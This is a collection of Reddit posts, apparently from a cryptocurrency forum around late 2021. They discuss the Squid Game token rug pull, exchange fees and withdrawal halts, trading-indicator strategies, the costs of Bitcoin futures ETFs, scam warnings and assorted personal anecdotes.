This sub is like society in general- lots of different people with differing opinions, and that's what makes a community worth being a part of. I've become aware of plenty of projects that I knew nothing about because they've been part of this discussion, popular or not. If you want to learn more you encourage diverse thinking!

But with the existence of moons, comment karma is monetized and downvoting someone else's valid opinion has a material effect. And it makes people less willing to offer their opinion again.

So next time you're about to downvote a comment based on a difference of opinion, maybe consider whether the comment was contributing to the discussion, esp at the request of the OP. And if that's the case, perhaps respect their right to an opinion and just move on!

I live in Virginia and its time for our gubernatorial election. I am constantly being barraged with fucking texts about getting out to vote!. Im tired of these spam fucking texts to vote for these washed up and old ass fucking boomers. This is besides my main point of: why cant I vote from my fucking phone yet!? Its almost 2022 and our election process is slow, bureaucratic, and never gets much participation especially in the US which is supposed to represent democracy. This is where smart contracts are going to fundamentally change the game. Decentralized voting systems and decentralized identity are the key to higher voter participation and much faster/secure vote counting. Not only that but if politicians wanted to really earn my vote they would tokenize their candidacy to raise money rather than being the corrupt shills that they are and take massive donations from corporations. They could also in theory figure out a way to put their promises that they make during their campaign in smart contracts to make their votes on policy changes automatic and immutable. Im not sure if everything I said here will be possible or here in the near future but god damnit let me vote from my fucking phone.

I know alot of people who are recently getting into crypto don't really know what they are doing! Myself included!
It's hard to know where to find trust worthy information on the topic! Most of YouTube can't be trusted because creates just want the views. 
Alot of articles are pretty much the same, catchy titles to get people to click.
It would be a bad move to get all of your crypto knowledge from what you have read on Reddit.

So where can newbies get good, honest information? About everything. 
What makes crypto go up and down? What effects the market cap and what effect does that have on the price? How do you find new coins that are worth investing in? 
To all the long term veterans in this sub, where did you learn about crypto?

I was sound asleep when I suddenly heard the sound of broken glass. I knew it right away, someone was trying to enter my house. I woke up my wife trying not to make noise but she was already awake. Ive heard it she said. We lay motionless in bed as we realized footsteps  were coming closer and closer until a hooded figure emerged from the shadows right next to our bed. I tried to make out who he was and noticed he was pointing a gun at me. I was scared to death and couldnt move a finger. He spoke Give me all the money you have or I will kill you both I thought to myself (ok give him what he wants and he will be gone in no time) Please dont shoot I have a lot of money, you can take it all just dont hurt us Where is it? he said menacingly I dont have it here, I have invested all my money in a brand new crypto and I just need to cash it out before I can give it to you He looked at me in silence, I knew for sure he was going to kill me so I started making peace with myself bro. you are not talking about this Squid Game crypto shit right? Dont tell me you dont know

Anyway, I spent the rest of the night crying as he was trying to comfort me He wasnt a bad guy after all, he told me all the places where we could get food for free and the best spots in town to sleep

So I used to use Coinbase to swing trade on as I typically did so with DOT and I used Coinbase as it was just nice and easy however the fees are stupid so I stopped. With the amount I was using per trade Id be paying 20 to buy and about 17 to sell, this was just eating into my profits. 

So I moved over to Binance and there are literally no fees for buying to selling or if there are its so small I dont notice. However now I cant withdraw to my bank as it says it doesnt support my region (UK) so I was wondering if I literally will have to use Coinbase? 

If there is another alternative or anyone can offer advice thatd be great!

I have noticed this while trying KuCoin for the first time thanks to my iphones real time notification if an app accesses your data/pics/camer/mic. 

When you run the app or switch back to it, it AUTOMATICALLY pastes whatever you copied I dont know if they are storing this or what. What if the last thing you copied was your seed phrase? Then hypothetically KuCoin now has your seedphrase. 

You guys can easily try this out if youre on the latest iOS version on your iphones/ipads. For the android users, Im not sure if youre being notified in real time.

Hey, I am pretty new to crypto, I use binance as a platform where I usually put my crypto and mainly hold it in there and do nothing much with it, so I never needed to pry in any new platforms or anything special. Recently though I have been approached by a friend of mine who asked for my advice because he wanted to take Crypto as a form of payment for his buisness, but he wanted a platform that didn't require identity verification (privacy + other reasons), since I didn't know any I wanted to know if there were any and if there were how safe is it to make an account there. Thanks

(sub-question, also for my friend, he has a client that some time ago was paid with bitcoin and wanted to know if even if he was on a different platform than where his client is holding bitcoin he could receive the payment. Or if it was needed for him to be on the same platform. Thanks x2)

The squid token which was used to buy-in to a round of an associated game  is known as a play-to-earn cryptocurrency, where people buy tokens to play an array of games on the platform.

A flurry of investors started to jump on the token following its launch on October 27 and play the game while also chasing a quick profit.

The developers even revoked their website

 Following a mind-blowing price surge, the Squid token plummeted over 99% shortly after Twitter flagged its official accounts on the social media platform as suspicious.

 Multiple warnings in the crypto community failed to stop the tokens incredible rally, with its price skyrocketing, hitting $ 90 on November 1st, then topping $ 2,000 for a few minutes. 

According to data on cmc the squid token experienced its first downward move on Monday, erasing its entire gains from as much as $2,861 and dropping below $1 in a matter of minutes.

Trying to wrap my brain around this:

Binance disabled withdrawals for every single crypto that exists. Supposedly, because they have a backlog of withdrawals. 

How is this even possible? Do they use a pi zero to handle withdrawals? Surely not every single crypto network would be affected at the same time.

If one network had been congested, that would be believable, but every single network out there all at the same time, while none of the other exchanges face any issue? Seems hard to believe. 

It might just turn out alright and just be a temporary withdrawal stop, though apparently, they reopened withdrawals temporarily, just to block them again.

I never Believe as of January when Doge was making the wave of Meme coins, Shib was Really around the corner with alot of criticism saying it will never Do great.

But how about now?

This is my Question! 
Is shib Going to Reach its potential or it could be a new Rug-pull based on The whales holding large portion of it 

I Got some 1000xgains Tho i will be taking partial profits because I dont think its a good idea holding meme coins 100%

* If you're not all in for the next ride. It's fine.
* If your alt hasn't pumped yet. It's fine.
* If you only found crypto recently. It's fine.
* Everyone is a genius in a bull market. 
* Last bear we had daily discussions with less than 100 comments. 
* Everyone says do your own research but half the coins that pop do so based on socials alone. 
* Money is made with patience and realised when there's hype, don't fomo, be ready for the next dip &amp; bear.
* Never sell everything.

Hi redditors,

A friend of mine was scammed when entering into the crypto space. He downloaded a sushiswap app, that also creates you a wallet. I think that the app does not creates you a wallet but it gives you a wallet that has already been created.

He couldn't explain me very well because he downloaded several apps from the Play Store to start playing with crypto (also uniswap and metamask). To be honest he can't explain me very well what happened, he is super noob in crypto.

Well, anyway, the thing is that the scammer somehow gives you also the private keys of that wallet, probably not the best scammer.

I guess that the idea is that you think that you have a functional wallet with private keys, you feel confident, and when you fund your wallet, zass, the funds are gone. That is how the scammer operates. The scammer has a bot running so that every transaction that is send to "your new address" is sent after 30secs \~1min to another wallet that he probably owns. 

&amp;#x200B;

I made a bot that is running faster than hims, so I am forwarding all the transactions to a new address that I own. Now I am running the bot on eth mainnet and on bsc, both chains in which I found that he is scamming.

&amp;#x200B;

I want to return the funds to the original users so I am wondering which is the best approach to follow, I have some doubts:

\- I don't want to send the funds to the original address and then that person falls again in the same scam. I am afraid that if that person felt into this scam, probably is going to be scammed again (maybe sending the funds again to the address because he think that he didn't received them). I don't want this to happen. But there is no way to contact that person. so....

\- Some of the original addresses are exchanges (for example coinbase). Should I contact the exchanges and notice them about this situation so I can send them back the tokens and then they send to the original users?

Do you have any suggestion on how I can return the funds to the users? Anything that I should take into account?

There are not that many transactions, maybe 1 every hour on main net and some more on BSC. But for some people are sending 0.1eth or 0.2 and it can be a lot of money for some people. I don't want them to loose it.

&amp;#x200B;

For the moment I don't want to reveal any information about addresses, because I don't want the scammer to know that I am in the middle. I don't know if the scammer already figured it out or not to be honest, there are incoming transactions. Maybe the address is harcoded in the "apps" and can't be changed.

Probably I am going to have a flood of DMs from scammers hehe. Sorry but please only contact me in this post. I won't respond any DM.

The address of the wallet has already been posted in reddit as a scammer address.

Cheers,

Do you guys do Yield Farming ? Which platforms do you use and why ?

I started to do yield farming when BTC got nuked down some months ago. A lot of platforms on many blockchains seem trustworthy and give nice yields but its a bit hard to decide what strategy to take.

If you do, whats your strategy to get the best yield and how do you monitor? I did some research on this sub and got to know about [moonfarm.finance](https://moonfarm.finance) and how their platform offers no impermanent loss.I haven't heard of any other dexes trying to solve this problem so this has kind of got me pretty excited but Im not sure about it and would like to know your thoughts.  
Also, are you farming for the passive revenue it brings or for accumulating more of the coins you already have ? I feel like yield farming can be either a passive endeavor or an active one where you try to find the best yields but I dont know the advantages or drawbacks of both.

**Cipher A**

[Cipher A](https://preview.redd.it/a135r7r6lzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=d362a6c7032ae77977d5db85613054ce53685c76)

**Cipher A**is comprised of 8 different EMA ribbons. These ribbons change color based on the trend of the market. Cipher A also has multiple symbols that populate on the candle stick chart to give a visual cue of what could happen in the market.

&amp;#x200B;

* **EMA Ribbon:**8 different EMA values, editable to your choosing. In its default settings, the ribbon color shows what trend we are in.  
\- **Blue or White**= bullish  
\- **Grey**= bearish  

* **Yellow/Green Diamond:**bullish continuation  

* **Red Diamond:**trend weakening.  

* **Green Circle:**bullish indicator, if followed by a yellow/green diamond, a breakout is possible.  

* **Red X**: Bearish indicator, if followed by a red diamond, a breakdown is possible.  

* **Blue Triangle**: Trend reversal indicator, momentum is decreasing, and a reversal is near  

* **Blood Diamond (large red diamond)**: Bearish indicator, if paired or followed with a red x or smaller diamond, a break downward is likely.

**Cipher A**looks great visually, however**Cipher B**is where you really make most of your trades from.

&amp;#x200B;

**The two best parts from Cipher A:**

1. **Blue triangles to prepare for a reversal**. If you see this, make sure you have your stop losses set.
2. **EMA ribbon**to help detect trends.  
\- **Hint:**disabling all ribbons except 4, 5, and 6, still allows us to see the trend without the chart being too busy.

&amp;#x200B;

**Cipher B**

[Cipher B](https://preview.redd.it/f0zsyj3glzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=520e7ff1d9fb2a6f87a3a1be11d5ed29a35ac597)

**Cipher B**is a combination of multiple oscillators in one. There are multiple waves to pay attention to.

At first look, this can look very chaotic and confusing, but lets break things down one by one.

&amp;#x200B;

* **Blue waves:**Momentum wave.  
\- Commonly used as a primary indicator  

* **Red and green dots (on waves)**: wave/RSI crosses.  
\- **Red**= price is currently moving lower.  
\- **Green**= price is currently moving higher  
\- Used as entry and exit points.  

* **Green and red lines on waves:**hidden divergences  
\- Assist with the blue wave trading strategy.  

* **Floating Dots above/below blue waves**  
**- Green**= local**bottom**, look for additional buy indications  
\- **Red**= local**top**, look for additional short indications  

* **Yellow Waves:**Volume Weighted Average Price (VWAP)  
\- Commonly used as a primary indicator, especially on shorter time frames  

* **Green and red waves:**Money flow indicator (Green Money flowing in, red money flowing out)  
\- Can be used as a standalone indicator, can be used with VWAP.  

* **Blue/Purple line:**Stoch RSI  
\- Not necessary and can be disabled. We will discuss this in this guide, but we do not personally use them for the main strategies.  
\- When the**Stoch RSI is low**, and crosses to go up (turn blue), you buy.  
\- When the**Stoch RSI is high**and crosses to go lower (turn purple), you sell. Simple and can work as its own strategy.

**Please Note:**Some of the triggers above are based on lagging indicators such as RSI divergences. That means some of these dots and triggers will not display live but rather 2 intervals back. This does not mean that its repainting, its simply because certain indicators are lagging indicators. Action can still be taken on lagging indicators. It should not impact the**main**strategies outlined below. 

&amp;#x200B;

**Blue Momentum Waves**

[Blue Momentum Waves](https://preview.redd.it/4csfwk4olzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=8191c1aa7df246ca1ee5732cc99f9a9b160ecd90)

For this indicator, you are looking for three waves in total:

* Wave**One**and**Two**on the same side of the Zero line.
* **The Gap**between the two waves on the other side of the Zero line.  


1. Waves**below the Zero**line indicate a**long.**
2. Waves**above the Zero**line indicate a**short.**

You can see how this indicator works in the three trades above.

**Rules for this strategy:**

The**first wave**must be**bigger than the second wave (the wave that follows the gap)**to enter a position.

This is not always true, and sometimes you could take a position without all three waves, but it isnt the safest method. Example would be Wave 1 in Yellow circled above. The far-left part of the blue wave could have been your first indication, and then the green dot circled could have been your entry position for a long. This works in some instances, but not all. That is why we typically look for a gap.

&amp;#x200B;

**Example Trades from above**

**Trade 1**

We took a long on trade 1, denoted by the yellow on the chart above. The reason for this trade are as follows:

1. **Wave 1**Large blue wave below the zero line.
2. **The Gap**A blue wave above the zero line on the other side.
3. **Wave 2**Blue wave on the same side of the zero line as the first wave.

**Entry Position:**You are looking for the white part of the wave, to cross the blue part of the wave**(indicated by the green dot)**.

**Stop Loss:**This should be the**support just prior to this move**.

**Exit**: You should be looking at the next wave above the zero line, when the white crosses the blue on the wave (**indicated by the red dot)**.

**Note:**This trade could have been skipped due to the head and shoulders present. In these situations, use your own due diligence and experiences to decide whether to enter the trade.

**Trade 2**

We took a short on trade 2, denoted by the red on the chart above. The reason for this trade are as follows:

1. **Wave 1**Large blue wave above the zero line
2. **The Gap**A blue wave gap below the zero line
3. **Wave 2**Blue wave on the same side of the zero line as the first wave.

**Entry Position:**When the white crosses the blue on the wave (indicated by a red dot).

**Exit:**You should be looking at the next wave below the zero line, when the white crosses the blue on the wave (**indicated by the green dot)**.

**Trade 3**

The same exact concept applies to this as Trade 1. In this trade, the gap for Trade 3 was also involved as Wave 2 in Trade 2. Depending how active you are trading, you could use waves back to back if they meet the trade criteria

&amp;#x200B;

**Red and Green Floating Dots**

[Red and Green Floating Dots](https://preview.redd.it/9hy726i0mzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=5ee30b0fe34940ab564887ec59e1966b7f99beb7)

* The**Floating Red Dots above the zero line**denotes when a local top is created.
* The**Floating Green Dots below the zero line**denotes when local bottoms are created.

In these situations, you want to start looking for another indication to enter the market.

&amp;#x200B;

**Volume Weighted Average Price (VWAP)**

&amp;#x200B;

[Volume Weighted Average Price \(VWAP\)](https://preview.redd.it/yfr2r8q5mzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=4ee08392d71ebbab56fba27220352bf48b1f06d0)

The VWAP indicator has been most successful on shorter time frame trades when youre able to spend a decent amount of time day trading.

Switch the VWAP indicator from waves to columns for a better visual of which direction it is going, and when it breaks the zero line. This is illustrated below in the following trade examples of how you can utilize VWAP. As you can see, there are a lot of trades taken and that is why it can require a bit of your time.

https://preview.redd.it/uuxssy2mmzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=7f1e91c69c027398f754c800ac2cafe58f57fc02

This backtest illustrated above is based on day trading on the 5-minute chart consistently.

Red vertical dotted lines indicate it was a short entry, green a long entry.

Other indicators used in conjunction with the VWAP:

1. Cipher As EMA ribbons
2. Cipher Bs Money Flow Indicator

In this test, the risk/reward was 1:1 with a 1% take profit and stoploss.

**Rules:**

1. Only enter a**short**when

* themoney flowindicator isred.
* TheVWAP is confirmed(2 candles)below the zero line.
* TheEMAribbon isgrey (bearish).

2. Only enter a**long**when

* Themoney flowindicator isgreen.
* TheVWAP is confirmed(2 candles)above the zero line.
* TheEMAribbon isblue/white.

**Results - 14 trades**

* 12 trades were successful with the 1% profit.
* 2 trades were unsuccessful and were stopped out at 1% losses.

Here is a little closer view of some of the trades.

https://preview.redd.it/ebkx1jopmzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=ad48b01945a6c6449c8beea2bee3c3bd42ff530f

&amp;#x200B;

**Money Flow Indicator**

[Money Flow Indicator](https://preview.redd.it/yux92o6smzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=7dc9621a6cce5f61280c406203e762d7da552b27)

This indicator is useful on any timeframe, and simply measures the amount of money being transacted.

* **Green**= money flowing in.
* **Red**= money flowing out.

As seen in the above and below images (4hr and 15 min charts) this indicator can be used by itself.

* **Long**when you have a candle or two confirming that the money flow is green and getting stronger.
* **Short**when you have a candle or two confirming the money flow is red and getting stronger.

**Stochastic RSI**

[Stochastic RSI](https://preview.redd.it/06og1v9wmzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=6c27de5556f41340bc030919ebbc00f43f3c18a9)

This indicator is useful in that you can simply buy with the Stoch RSI crosses.

* **Long (or close short):**When the Stoch RSI is low, crosses to go up, and turns blue.
* **Short (or close long):**When the Stoch RSI is high and crosses to go down, and turns purple.

This can be seen above on the 4hr chart.

&amp;#x200B;

**Cipher DBSI**

**Cipher DBSI (Dual band Strength Index)**measures momentum and displays whether the bulls, or the bears are winning the market battle. By default, the indicator settings populates with**columns**. Switching the settings from columns to**Area**can help you visualize the changes and strength a little better.

Other symbols to pay attention to are the red and blue circles.

* **Red**means possible**sell**signal
* **Blue**a possible**buy**signal.
* **Orange X**indicate there is a market battle between the bulls and the bears. With the markets lately, this seems to be a regular indicator so I typically would hide this to reduce the noise on the screen.

The rule for this is indicator:

* **Only long**when a blue dot has printed after the blue bullish momentum waves have been confirmed (12 candles)
* **Only short**when a red dot has printed after red bearish momentum waves have been confirmed.

In the screen shot below, you will find the 4hr chart from when we started our down trend.

https://preview.redd.it/qo6ogaz0nzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=6107b349003c859523f9eab25e853152b6086311

If you see the**first dotted vertical line**you see that the bulls lost their momentum, as the blue wave has now**turned red**, the candles**are red**, and a**red possible sell circle**has printed.

If you did not sell at that point, then let us look at the next set of dotted vertical lines.

Briefly, the bulls took control again, but quickly the momentum swung back in the bears favor. Multiple red 4hr candles, and then a red sell circle.

The candle after the signals candle closed was met with an 11% drop. If you continued to hold through that, you will see the same signals on the third set of vertical dashed lines, with more downside to follow.

Now let us look at the recent price moment and some trades that could have been made using DBSI.

https://preview.redd.it/iwu0tfg4nzw71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=a3a320528efd7f6a7c7878d22b48fe89b8233e51

* **For Stops** we can afford to lose 2.5% or prior support, whichever is less.
* **For Take Profit**5% target point.

As you can see here, there are 4 trades with just using this indicator following the rules above. The**first two**trades were**wins**, the**third a loss**, and the**fourth trade**we would still be in at the time of writing this.

&amp;#x200B;

**Summary**

In combination the indicators are very powerful a good tool to make profitable trades. Some of them are a bit more complicated but when you learn and use them you can make good trades.

This is no financial advice

As we all know, the Squid Game token had a 99.99% rugpull and was basically a scam. I don't want to sound rude, but if you lost money investing in Squid Game token you deserve it. In this sub we always mention that you should always DYOR, if you want to gamble some money in memecoins its fine, but dont be surprised if you lose it all. For those who invested in Squid Game token, Im sorry, but it only takes little effort to know if a project is a scam or not. Its so easy to fall for scams when you go with the flow, especially if youre a beginner, but that can be solved if you DYOR. Dont let yourself lose money just because youre too lazy to DYOR, if you lost money, its fine, just learn the lesson so you dont make the same mistake again.

I've looked around and I've tried to figure out how to live life without a traditional Bank. I've got a crypto.com Visa that I top up from my direct deposit from my employer. And I'm down to only two transactions that come out of my bank account that I can't move over to my CDC Visa. Car payment and my camper payment. 

Are there any projects out there that are going to replace traditional banking with crypto banking? AAVE? 

Is there any way to move my car and camper payments onto a crypto platform? I'm almost to the point where I keep my bank account just for those two payments and cashing the occasional check, but at some point I would love to give my final middle finger to 100-year-old institutions.

Hello all, 

I'm very new to the crypto scene. A lot of the phrases used are lost on me such as bull Market and etc. 

I have a question though. 

I have the cyrpto.com account and whenever I log in and look at my wallet it gives a +% and +. But when is this based from? From when I last put money in? From the last time I looked? From midnight? It's hard to tell when I've earned and by how much. 

Just for curiosity it's a very small wallet  no bitcoin or etherium for me. 

Thank you for anyone who responds to clarify things.

A lot of people have no idea what the coins theyre investing in do. They just follow others. Others know every detail and explain things very technically.

But very few people can explain what their favorite coin/token really does. ELI5: In one or two sentences explaining in plain and simple English without technical terms. 

So please, pitch your favorite coin in the comments so that everyone outside of crypto can also understand.

I'm thinking its going to be a close one, where do you think it'll land by the time voting closes, whats your vote and why?

I have seen many good reasons for both, just watched the debate on Algonauts official on YouTube too which was great in highlighting most points. Wondering if I could get a bunch more opinions to read through today before I cast my vote. I know which way I'm leaning but really still quite unsure.

Might even be better to wait another week to see more discussion on the whole topic. What do you think?

I am selling my house, and have to show it while still occupying. 

The real-estate agent sent someone into the house without being present. Well, they stole a laptop which I removed from the internet and used as a wallet for a while now. They had to move a heavy weight set to get onto the drawer it was stored in.

The agent told me she is not responsible, which is true in her contracts. I looked everywhere trying to find what I can do if someone steals during a showing. The answer is a hard nothing. I filed a police report, which also said they couldn't do much.

I decided to be my own detective (this is my mistake). I searched online marketplaces for local listings. Finally, a couple of days later, there it was. My laptop on facebook marketplace. So I made the offer and agreed to meet up. My brother and I went to go check it out.

When I got there, it was a sketchy dude covered in scabs in a super gross looking dope house. I asked if I could check it out and make sure it works. He said he couldn't remember the passcode, but I should be able to get it going. That's when I was certain. 

I opened it, saw my name, typed my password and hit enter. I looked up at him and told him this is mine. I have a police report open for this and he stole it. I tucked it under my arm and stood up to leave. My brother stood between him and me while we walked out of the house. 

A few hours later, I got a visit from the police at my front door. I told them I made a police report, and there is no way that guy would know where I live unless he was the one to steal it. Well, they demanded the laptop from me or I will be arrested. The guy claimed I assaulted him and I got arrested anyways and they got the laptop. Never been to jail before.

This is where I leave off. It sucks. Called my attorney, and he said I am an idiot. I am an idiot. Don't do what I did. I should have let the loss go. Hopefully I can win in court, and hopefully I get my laptop back and can pay the fees with the sale of the currency left on it. Praying for no dumps in the meantime. 

Seriously, don't be a detective.

The new Bitcoin ETF "BITO" is a futures ETF. Before holding it long-term, you should know that the futures price for Bitcoin is quite a bit higher than the spot price (a situation known as "contango") which will eat away at gains in the ETF.

The ETF "rolls" its futures every month, which means it sells the futures that are about to expire and buys the futures expiring the next month. If we assume they did this last Thursday (the day before expiry for October futures), we can [see](https://www.cmegroup.com/markets/cryptocurrencies/bitcoin/bitcoin.settlements.html#tradeDate=10%2F28%2F2021) they would have sold their October futures for $61,335 and bought the November futures for $61,780. That's a 0.7% spread, and since they do this every month we can expect the ETF to lose 9% a year compared to actual Bitcoin, plus another 1% for its expense ratio.

Those spreads might come down in a few weeks or months, which would make the ETF a better deal. But for now I would think twice if you can hold actual Bitcoin instead. Even if the ETF allows you to invest in a tax-free account, if the current contango situation continues it may not be worth it for a long-term holder, since your tax benefit would get eaten in a few years.

Where is the money going? Mostly hedge funds. You can read about how they capitalize on the opportunity by shorting the futures and longing the underlying Bitcoin [here](https://www.bloomberg.com/news/articles/2021-10-18/crypto-s-money-printing-machine-has-turned-back-on-for-now) or [here](https://blockworks.co/the-basis-trade-in-bitcoin/). Technically, that opportunity is open to anyone adventurous enough and with the market access to get into futures trading. Note that it's actually better if more people (and hedge funds) take advantage of the opportunity, since they're arbitraging away the futures premium and making the ETF a better buy. In a way, you can think of it as them getting paid to hold real Bitcoin on behalf of the ETF, and more competition on that front will bring down the rates. However, personally I think I'll pass on this one because without a source of leverage (like the bank loans available to hedge funds) the trade would only make about 6% a year, and futures positions require frequent monitoring, and the taxes would be pretty complicated.

As the price of Bitcoin reached an all-time high in October, a recent report from Kraken Intelligence sheds light on whats behind the surge.

Details: The data from the report points to a potential supply shock where long-term holders are not taking profits. The number of bitcoins that havent moved in the past 6 months has already reached a 3-year low, according to the report.

Big Picture: Basically, the report finds a lot of strength among long-term holders and mining pools. This includes individual miners who have realized modest profits.

Numbers: The price of Bitcoin skyrocketed over 35% in October.

Final Thoughts: Despite these trends, the report concludes that there is a considerably healthy macro environment for Bitcoin.

Hey guys!

I've made a detailed video guide for the community about the sILV Token:

[https://www.youtube.com/watch?v=IRIKYc80WT8](https://www.youtube.com/watch?v=IRIKYc80WT8)

The sILV token is the token that will be used inside the ecosystem of the best crypto game (in my opinion) that will be launched in Q1 2022.

In the video, we will understand what is sILV token (Synthetic ILV) which is the in-game token inside the upcoming game Illuvium. 

We will understand what are the usages of this token, and how it's different from the ILV token. 

The main difference is that sILV is the token that will be used inside the Illuvium game and ILV is the governance token and it's also a token that you can stake and yearn more ILV's :) 

I will also share my illuvium staking strategy and I will explain why sometimes I claim sILV instead of compounding ILV.

Hope you will enjoy the video as much as I enjoyed making it!

Will be more than happy to hear your comments.

Johnny.

So my friends and I are aspiring female conoisseurs and booked some spots to a local gentleman's club in Duisburg, Germany. I decided that I wanted to try paying with crypto and looked through my staking wallets. I am currently staking a few different coins (TRX, NEO/GAS, XTZ and ETH). I sent some of the staking rewards towards my Binance account and sold them for BTC. Loaded up my Binance card with it and out we went. Arriving at the scene got me very excited because there were loads of lightly clothed women walking around and teasing the adventure-seeking men. While we inched closer to the front desk I excitedly grabbed my card out of my pocket, while also swiftly rearranging my tool through my front pockets as to not show my extreme happiness.

The host at the front desk provided me my entry pass and told me the amount. "Card please" I said happily. He started pushing some numbers and put the card reader in front of me. I hold my card onto it and it starts beeping, *transaction completed*. I walk through happily and grab my phone: "-0.001102213 BTC (60.04 EUR)".

*Nice*

Needless to say, we had a great night as I proceeded to empty my card at the ATM machine and use the cash for some good times. 10/10 would do it again.

**Let me just be clear that I live in Europe and prostitution is legal here. I do not encourage you to break any laws in your respective countries.

We should be careful and learn from SQUID GAME . I think in the future there will be some similar token scams.

What was the problem with Squid Game?
**The tokens could be purchased but could not be sold back!**

Numerous investors tried to realize profits, but failed to resell the token. A built-in "anti-dump mechanism" wass designed to discourage buyers from dumping their tokens. Only with another token called MARBLES you were able to sell. In the end a rug pull happend and many people lost their money.

**What can be done about it now?**

1) Definitely DYOR before investing. Many red flags were actually visible before

Here are 2 good guides how to do DYOR:

* [A Guide On How To DYOR Do Your Own Research In An Effective Manner] (https://www.reddit.com/r/CryptoCurrency/comments/lw80l9/a_guide_on_how_to_dyor_do_your_own_research_in_an/)

* [Everyone talks about DYOR - How to DYOR] (https://www.reddit.com/r/CryptoCurrency/comments/llehit/everyone_talks_about_dyor_how_to_dyor/)

2) Once you are conviced to invest, invested only a small portion and try to convert back.

In light of my 10th cake day (10 years already, time sure flies..), I just want to thank my favorite masochistic community, CC. I love and hate every last one of you. You make my darkest days seem a wee bit darker and my brightest days a sliver of light brighter. 

You inject me with life-sustaining Hopium when I'm in dire need, and carve out beautiful, looming caves for the bear within. 

You make me laugh, you make me cry, you make me vomit, you make me try. Try to resist the FOMO, try to resist the FUD. Just DCA and HODL you say! You do your best, and that is all one can ever ask. 

I hope you all find your personal moons, and I get too greet you there in the vast, endless Metaverse.

**Peace.**

Crypto is making the life of average Joes like you and I much easier and manageable. Its helping people develop a side job/passive income better than any other service or market out there.

Then some geezer that has no idea how crypto works says its all just a scheme or EVEN WORSE crypto is very inefficient and is bad for the environment!

Well yeah but compared to other industries its consumption is nothing plus its getting better at efficiency especially considering that swaps like QuickSwap, UniSwap and upcoming ones like Swappy are some of the cheapest and fastest swaps out there that barely consume any energy. Why is THAT never mentioned? Why does progress in efficiency never get light in the media?

As crypto currency popularity soars and more people come into the crypto space, they get bombarded with a new kind of language otherwise known as crypto slang (If I can call it this). I remember as a newbie I saw people spelling HOLD as HODL, it was confusing at first but with time I came to appreciate and embrace crypto unique words and all the peculiarities that come with it. Till date some of my favorite are Hodl (I know right) and when lambo. 

&amp;#x200B;

What are your favorite and what words were first confusing at first when you entered crypto.

I just want to share my $50k dollar mistake with you all. No, I didn't get scammed or hacked, but I feel like this will happen with some new alt heavy users. 

I learned an extremely important lesson the other day:

ALWAYS KEEP TRACK OF YOUR ALTS.

My first mistake was assuming a coin I bought in 2017 was dead. I had around 950 tokens that, for a good 3 years, hovered around $80 in value after dropping from my original $300 purchase. 

Mistake number two was never writing down which exchange I bought it from, what my recovery keys were to that wallet, and never bothering to transfer over the 2FA to my new phone. After all, why would I do all that for $80. 


I keep a portfolio tracker app but I never check the very bottom (my dead alts). Well yesterday I did. Turns out I have $10k just sitting in some exchange I don't remember because there are so many, and not only that...but months ago it reached $46,000 in value and I never freaking noticed. Now, that doesn't mean that would have changed anything because I still lost all that info, and I still am very much looking for it. But I would have made a large profit if I only kept track of all my alts...even the "dead" ones.

I'm trying to figure out where best to earn some money on my crypto assets but looking at blockfi I have way more than 0.1btc and 1.5ETH. I can stake my ETH for 4.9% or get 5.5% on crypto.com, voyager, celcius. Or with BTC get about 6.5% compared to blockfi 4.5% for only 0.1 BTC.

Why such the huge disparity am I missing something in how blockfi is calculating returns compared to the others or are the other sites considered that much more riskier that they offer rates that much higher to attract people?

In an hypotetical scenario where every single human is an expert trader and only invest when the Markets are Red, what would happen then?

If you think about it, you can't sell / buy without a counter-part who's willing to buy / sell your trade, right?

With that being said, usually what happens is that experienced traders / investors make profits out of noobies / new-comers, people who're new to this world and don't know crap.

Let's suppose for a moment that every single new-investor makes proper research and educate himself accordingly before committing wrong decisions. What would happen then?

Would the Markets just stay stale forever? Is this scenario even possible or it's just me being utopian?

\*\*I AM NO EXPERT BUT I THINK THIS IS JUST COMMON SENCE\*\*

Anyway last thursay the price was down -7.5%

Friday up +23%

Saturday up +51%

Sunday up +118%

today at this second up +1.3%

Why the rally? If you have not heard, Facebook is changing to Metaverse, and now their focus is going to be virtual reality.

Anyway as CNBC puts it, "Mana is the native digital token of Decentraland, a self-proclaimed metaverse platform where users can buy and sell virtual properties."

MANA is a coin that lets you buy stuff in a virtual reality.

Like the Idea or not this is what FB is gonna be pushing their almost 3 BILLION USERS towards, thats approx 1/2 of the worlds population!

I think this may have the potential of reaching 40-50usd in a year or so, currently its $3.30 each!

GOOD LUCK!

So me and my friends (at least most of them) have put some money in the crypto market as every new investor since the Doge fuzz made us take a further look on this space. That's the only good thing Doge did to us but that's maybe a different post. 

Yesterday my best friend came back from his Erasmus and we had a long conversation about our investments like grown multimillionaire investors we hope to become. When I asked him whats your portfolio right now he told me and I didn't know most of these coins so I asked him. 

Guess what.. He didn't know what most of them do or even what purpose they serve. I was shocked. He has invested a respectable amount of money according to our standards and he doesn't have a tiny clue what he has bought. To give you an example I asked him what is bitcoin and ethereum and the answer was "I don't know all the technical details man". 

THEN WHY THE FUCK YOU PUT ALL YOUR SAVINGS IN SOMETHING YOU DON'T EVEN UNDERSTAND? 

That was my response and immediately I did the same test to all of my friends. It turns out they are a bunch of uneducated gamblers who hope to achieve a 10x. FUCK.

This leads me to the conclusion that most of the people in the crypto market are this way. It's not that I know everything about every project out there but at least I do research before putting my hard earned money in there. Am I wrong?

Was just surfing the CoinMarketCap and came across a coin named  ElonDoge DAO (EDAO)

This MF has gained +6800% in 24 hours. The market cap of this shit is not verified at all. Those who are already into this, be cautious. Take some profits while you can. I have a bad feeling about this too. Seems like a rugpull soon.

As a developer of webapplictions i like the app. Clear UI easy to understand and very newcomer friendly. But their approach of new listings is an ethical nightmare. 

